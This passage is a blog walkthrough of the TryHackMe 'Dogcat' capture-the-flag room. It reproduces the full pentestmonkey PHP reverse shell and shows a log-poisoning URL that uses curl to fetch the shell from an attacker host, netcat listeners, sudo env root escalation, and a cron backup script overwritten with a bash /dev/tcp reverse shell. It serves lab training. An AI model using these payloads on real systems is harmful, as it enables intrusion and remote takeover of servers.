class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment">// do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">// it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment">// published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">// GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></span><br><span class="line"><span class="comment">// you, then do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment">// me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Description</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment">// The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Limitations</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></span><br><span class="line"><span class="comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></span><br><span class="line"><span class="comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">''</span>;  <span class="comment">// Your tun0 ip (ifconfig in terminal)</span></span><br><span class="line">$port = <span class="number">9999</span>;</span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">'pcntl_fork'</span>)) &#123;</span><br><span class="line">	<span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">	$pid = pcntl_fork();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">		printit(<span class="string">"ERROR: Can't fork"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Make the current process a session leader</span></span><br><span class="line">	<span class="comment">// Will only succeed if we forked</span></span><br><span class="line">	<span class="keyword">if</span> (posix_setsid() == <span class="number">-1</span>) &#123;</span><br><span class="line">		printit(<span class="string">"Error: Can't setsid()"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$daemon = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	printit(<span class="string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line">chdir(<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$sock) &#123;</span><br><span class="line">	printit(<span class="string">"$errstr ($errno)"</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource($process)) &#123;</span><br><span class="line">	printit(<span class="string">"ERROR: Can't spawn shell"</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></span><br><span class="line">stream_set_blocking($pipes[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($sock, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">"Successfully opened reverse shell to $ip:$port"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="comment">// Check for end of TCP connection</span></span><br><span class="line">	<span class="keyword">if</span> (feof($sock)) &#123;</span><br><span class="line">		printit(<span class="string">"ERROR: Shell connection terminated"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check for end of STDOUT</span></span><br><span class="line">	<span class="keyword">if</span> (feof($pipes[<span class="number">1</span>])) &#123;</span><br><span class="line">		printit(<span class="string">"ERROR: Shell process terminated"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">	<span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">	$read_a = <span class="keyword">array</span>($sock, $pipes[<span class="number">1</span>], $pipes[<span class="number">2</span>]);</span><br><span class="line">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">	<span class="comment">// data to process's STDIN</span></span><br><span class="line">	<span class="keyword">if</span> (in_array($sock, $read_a)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK READ"</span>);</span><br><span class="line">		$input = fread($sock, $chunk_size);</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK: $input"</span>);</span><br><span class="line">		fwrite($pipes[<span class="number">0</span>], $input);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If we can read from the process's STDOUT</span></span><br><span class="line">	<span class="comment">// send data down tcp connection</span></span><br><span class="line">	<span class="keyword">if</span> (in_array($pipes[<span class="number">1</span>], $read_a)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT READ"</span>);</span><br><span class="line">		$input = fread($pipes[<span class="number">1</span>], $chunk_size);</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT: $input"</span>);</span><br><span class="line">		fwrite($sock, $input);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If we can read from the process's STDERR</span></span><br><span class="line">	<span class="comment">// send data down tcp connection</span></span><br><span class="line">	<span class="keyword">if</span> (in_array($pipes[<span class="number">2</span>], $read_a)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR READ"</span>);</span><br><span class="line">		$input = fread($pipes[<span class="number">2</span>], $chunk_size);</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR: $input"</span>);</span><br><span class="line">		fwrite($sock, $input);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">fclose($pipes[<span class="number">2</span>]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> <span class="params">($string)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!$daemon) &#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"$string\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Then I opened a http server in the directory I had the modified php shell:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure>
+
+<p>Then download the file with curl:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=curl -o shell.php &#123;TUN0&#125;:8000/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Before we open the file, we have to listen for incoming connection on the port we defined in the php shell on our machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp &#123;PORT&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Then open the shell on the server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Sadly we can’t stabilize that shell with some poor mans pentest, because python is not installed.</p>
+<h2 id="Getting-Root"><a href="#Getting-Root" class="headerlink" title="Getting Root"></a>Getting Root</h2><p>Let’s just run some code to see if there are some SUIDs we can run:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>As you can see we can run /usr/bin/env with no password.</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/sudo.png" class="" title="sudo">
+
+<p>Give it a search on GTFOBins to see how we can get a root shell:</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/gtfobins.png" class="" title="GTFOBins">
+
+<p>And there you go, you got a root shell!</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/whoamiroot.png" class="" title="whoami">
+
+<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag 3"></a>Flag 3</h3><p>The 3rd flag is in the <strong>/root</strong> directory. You can just cat it out, just like the previous ones.</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/flag3.png" class="" title="flag3">
+
+<h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag 4"></a>Flag 4</h3><p>The problem with the 4th flag is, that it is outside of this container. This might sound confusing, but the essence is, is that we just have to get another shell.</p>
+<p>In /opt/backups we can se that there is a backup script that is run regularly to generate a backup.tar file. Let’s use this to genreate another reverse shell outside of this container.</p>
+<p>We can easily exploit, that this script is run every other minute with root privileges, by inserting some code that will generate a reverse connection to us.<br>To insert this code into the script, simply run this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"#!/bin/bash"</span> &gt; /opt/backups/backup.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&#123;TUN0&#125;/8888 0&gt;&amp;1'"</span> &gt;&gt; /opt/backups/backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>And listen on port 8888 on your machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 8888</span><br></pre></td></tr></table></figure>
+
+<p>Now wait a few seconds (or minutes, for me it took just a few seconds) and you get another root shell.</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/secondRootShell.png" class="" title="SecondRootShell">
+
+<p>The fourth flag is in <strong>/root/flag4.txt</strong></p>
+<img src="/2020/07/11/Dogcat-TryHackMe/flag4.png" class="" title="flag4">
+
+<h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>And there you have it! I hope you had fun, I know I did 🦄</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archive</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-Access"><span class="toc-number">2.</span> <span class="toc-text">Gaining Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-1"><span class="toc-number">3.1.</span> <span class="toc-text">Flag 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-2"><span class="toc-number">3.2.</span> <span class="toc-text">Flag 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-Root"><span class="toc-number">4.</span> <span class="toc-text">Getting Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-3"><span class="toc-number">4.1.</span> <span class="toc-text">Flag 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-4"><span class="toc-number">4.2.</span> <span class="toc-text">Flag 4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-End"><span class="toc-number">5.</span> <span class="toc-text">The End</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&text=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&is_video=false&description=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Dogcat - TryHackMe&body=Check out this article: http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&name=Dogcat - TryHackMe&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&t=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Ecrax
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archive</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-172150421-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
